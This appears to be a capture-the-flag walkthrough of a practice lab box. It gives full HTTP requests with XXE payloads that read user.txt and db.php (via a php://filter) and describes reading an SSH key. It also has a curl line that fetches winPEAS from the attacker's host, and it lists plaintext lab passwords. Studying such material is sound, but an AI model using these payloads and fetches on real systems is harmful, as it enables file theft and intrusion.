![[Pasted image 20210426114453.png]]

Starting with a basic nmap scan

`nmap -sC -sV 10.10.10.49`

![[Pasted image 20210426120258.png]]

We have the port 80 open 

![[Pasted image 20210426173153.png]]

We have the credentials we got from the login.sql file from the previous box

username : `Daniel`

password : `>SNDv*2wzLWf`

The credentials worked and we got a interface 

![[Pasted image 20210426173630.png]]

In the source code we can see that the file was edited by the user Daniel

![[Pasted image 20210426174648.png]]

Viewing the request in the burpsuite we find that the web-app is using the XML format to transfer data 

![[Pasted image 20210426174933.png]]

![[Pasted image 20210426175221.png]]

```
POST /process.php HTTP/1.1
Host: 10.10.10.49
Content-Length: 109
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: text/xml
Accept: */*
Origin: http://10.10.10.49
Referer: http://10.10.10.49/services.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=0303ik7g28fru0f6bae0aql3hv
Connection: close

<?xml version = "1.0"?>
<!DOCTYPE test [ <!ENTITY name SYSTEM "file:///c:/users/daniel/Desktop/user.txt">]>
<order><quantity>3</quantity><item>
&name;
</item><address>AA</address></order>
```

We get the user.txt flag in the response 

![[Pasted image 20210426175420.png]]

Now we can use the XXE to view the xampp installation's db.php file 
But first we need to apply a php filter which will encode and view the content of the file db.php

![[Pasted image 20210426180312.png]]

```
POST /process.php HTTP/1.1
Host: 10.10.10.49
Content-Length: 217
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: text/xml
Accept: */*
Origin: http://10.10.10.49
Referer: http://10.10.10.49/services.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=0303ik7g28fru0f6bae0aql3hv
Connection: close

<?xml version = "1.0"?>
<!DOCTYPE test [ <!ENTITY name SYSTEM "php://filter/convert.base64-encode/resource=c:/xampp/htdocs/db.php">]>
<order><quantity>3</quantity><item>
&name;
</item><address>AA</address></order>
```

![[Pasted image 20210426180338.png]]

Now as we have ssh enabled , we have a username and also the XXE vulnerability 
we can read the contents of the Daniel user's private ssh key , which we can then use to ssh into the daniel user

![[Pasted image 20210426180749.png]]

Save the file id_rsa , change the file permissions to 600 

![[Pasted image 20210426181106.png]]

`curl http://10.10.17.67:800/winPEASx64.exe -OutFile C:\Users\Daniel\Desktop\winpeas.exe`

We get the winpeas file and after executig it we fin the password for the Administrator user in plain texet 

![[Pasted image 20210426182628.png]]

Username : `Administrator`

Password :`Yhk}QE&j<3M`

![[Pasted image 20210426182903.png]]

